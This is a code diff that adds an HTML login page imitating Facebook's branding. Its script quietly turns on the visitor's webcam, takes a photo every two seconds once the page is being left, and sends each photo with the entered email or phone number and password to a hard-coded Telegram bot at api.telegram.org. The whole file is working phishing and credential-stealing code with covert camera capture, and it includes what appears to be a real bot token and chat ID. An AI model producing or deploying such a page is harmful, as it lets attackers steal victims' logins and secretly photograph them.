@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook-like Login with Continuous Selfie Capture</title>
+    <style>
+        /* Your CSS styles for the login form go here */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #ffffff;
+            width: 400px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            text-align: center;
+        }
+
+        .logo img {
+            width: 150px;
+            margin: 20px 0;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin: 20px 0;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+        }
+
+        .form-group label {
+            font-weight: bold;
+        }
+
+        .forgot-password {
+            text-align: right;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: #ffffff;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-button:hover {
+            background-color: #0e63a7;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .create-account a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        #selfieVideo {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="facebook-logo.png" alt="Facebook Logo">
+        </div>
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="emailOrMobile">Email or Phone Number:</label>
+                <input type="text" id="emailOrMobile" name="emailOrMobile" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="forgot-password">
+                <a href="#">Forgot Password?</a>
+            </div>
+            <button class="login-button" type="submit">Log In</button>
+        </form>
+        <div class="create-account">
+            <p>Don't have an account? <a href="#">Sign Up</a></p>
+        </div>
+        <video id="selfieVideo" width="400" height="300" autoplay></video>
+    </div>
+
+    <script>
+        const form = document.getElementById("loginForm");
+        const emailOrMobileInput = document.getElementById("emailOrMobile");
+        const passwordInput = document.getElementById("password");
+        const selfieVideo = document.getElementById("selfieVideo");
+
+        // Request camera permission and start capturing selfies
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
+                selfieVideo.srcObject = stream;
+
+                // Listen for the beforeunload event to capture a selfie when the user leaves the page
+                window.addEventListener("beforeunload", function () {
+                    const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+
+                    // Capture a selfie every 2 seconds (adjust the interval as needed)
+                    setInterval(() => {
+                        imageCapture.takePhoto()
+                            .then(photoBlob => {
+                                // Convert the photo blob to a data URL
+                                const reader = new FileReader();
+                                reader.onloadend = function () {
+                                    const selfieDataUrl = reader.result;
+
+                                    // Send the email/mobile, password, and selfie to your Telegram bot
+                                    const message = `Login Details\nEmail/Mobile: ${emailOrMobileInput.value}\nPassword: ${passwordInput.value}`;
+                                    sendMessageToTelegram(message, selfieDataUrl);
+                                };
+                                reader.readAsDataURL(photoBlob);
+                            })
+                            .catch(error => {
+                                console.error("Error taking photo:", error);
+                            });
+                    }, 2000); // 2 seconds interval
+                });
+
+                // Stop the video stream when the form is submitted
+                form.addEventListener("submit", function () {
+                    stream.getTracks().forEach(track => track.stop());
+                });
+            })
+            .catch(function (error) {
+                console.error("Error accessing camera:", error);
+            });
+
+        function sendMessageToTelegram(text, selfieDataUrl) {
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
+            const botToken = '6410341150:AAFj6EhTYuf8fKgQtR8K1wkNHfS7TsD4ooo';
+            const chatId = '6253748836';
+
+            // Construct the message and send to the bot
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', text);
+            formData.append('photo', dataURLtoBlob(selfieDataUrl), 'selfie.jpg');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Login details sent to your Telegram bot!");
+                    } else {
+                        console.error("Failed to send login details.");
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+    </script>
+</body>
+</html>
